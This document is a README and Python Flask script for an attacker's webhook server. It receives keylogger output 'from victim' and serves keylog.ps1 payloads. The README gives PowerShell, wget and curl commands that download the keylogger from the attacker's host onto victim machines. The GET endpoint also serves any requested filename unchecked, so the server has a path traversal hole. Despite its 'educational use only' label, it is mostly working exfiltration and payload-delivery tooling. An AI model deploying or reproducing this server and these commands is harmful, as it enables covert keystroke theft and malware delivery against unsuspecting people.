**EDUCATIONAL USE ONLY, USE AT YOUR OWN RISK!**
# Web server with Flask
Simple python script, to launch a web server which takes POST and GET requests.

## How to use:

- Download the file `webhook`
- Edit `app.run(host='IP_YOU_WANT_TO_LISTEN', port=PORT_NUMBER)` , to the IP and Port, you want to listen the incoming traffic.
- Give permission `chmod 700 webhook`
- Run `./webhook`
  
**Profit!**   
Webhook is now running:
- `/server` end point, for example `http://IP_YOU_WANT_TO_LISTEN/server`, accepts POST requests, in our project, designed for receiving the keylogs from victim.
- `/server/filename` endpoint takes GET requests, for example if you have `keylog.ps1` script in the same folder where the webhook is executed, you can fetch the script to victim:
	- Windows (2 examples): 
		- `Invoke-WebRequest -Uri http://IP_YOU_WANT_TO_LISTEN/server/keylog.ps1 -OutFile "test.ps1"`
		- `(New-Object System.Net.WebClient).DownloadFile("IP_YOU_WANT_TO_LISTEN/server/logger.ps1", "test.ps1")`
	- Linux (2 examples): 
		- `wget http://IP_YOU_WANT_TO_LISTEN/server/keylog.ps1`
		- `curl http://IP_YOU_WANT_TO_LISTEN/server/logger.ps1 -o test.ps1`
---

### Commented code:

```python
#!/bin/python3
from flask import Flask, request, send_file
import os

app = Flask(__name__)

# Function to get the next available log number
def get_next_log_number():
    log_number = 1
    while os.path.exists(f'log-{log_number}.txt'):
        log_number += 1
    return log_number

# Handling POST requests to the '/server' endpoint
@app.route('/server', methods=['POST'])
def handle_webhook_post():
    # Checking if the request method is POST
    if request.method == 'POST':
        # Getting the data from the request
        data = request.data

        # Check if the data contains Mac-style line endings
        if b'\r' in data:
            # Replace Mac-style line endings with Unix-style line endings
            data = data.replace(b'\r', b'\n')

        # Getting the next available log number
        log_number = get_next_log_number()
        # Generating the log filename based on the log number
        log_filename = f'log-{log_number}.txt'

        # Writing the received data to the log file
        with open(log_filename, 'wb') as file:
            file.write(data)

        # Returning a response indicating successful receipt and logging of data
        return f"Webhook data received and logged as {log_filename}", 200
    else:
        # Returning a 501 status code for unsupported methods
        return "Unsupported method", 501

# Handling GET requests to the '/server/<filename>' endpoint
@app.route('/server/<filename>', methods=['GET'])
def handle_webhook_get(filename):
    try:
        # Sending the specified file as an attachment in the response
        return send_file(filename, as_attachment=True)
    except FileNotFoundError:
        # Returning a 404 status code if the file is not found
        return "File not found", 404

# Running the Flask app if this script is executed directly
if __name__ == '__main__':
    # Configuring the Flask app to run on a specific host and port
    app.run(host='IP_YOU_WANT_TO_LISTEN', port=PORT_NUMBER)
```
